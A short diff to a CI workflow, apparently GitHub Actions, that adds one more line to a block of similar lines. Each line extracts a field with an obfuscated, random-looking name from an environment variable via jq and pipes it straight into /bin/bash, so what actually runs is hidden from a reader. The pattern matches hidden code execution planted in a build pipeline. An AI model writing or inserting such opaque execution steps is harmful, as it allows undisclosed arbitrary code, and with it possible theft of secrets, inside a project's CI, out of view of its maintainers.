@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$unw1" | jq -r .jady43617 | /bin/bash
           echo $aa32206 | jq -r .gvih741 | /bin/bash
           printf '%s' "$cgl64" | jq -r .qud588 | /bin/bash
+          printf '%s' "$rk52" | jq -r .edlwi5 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
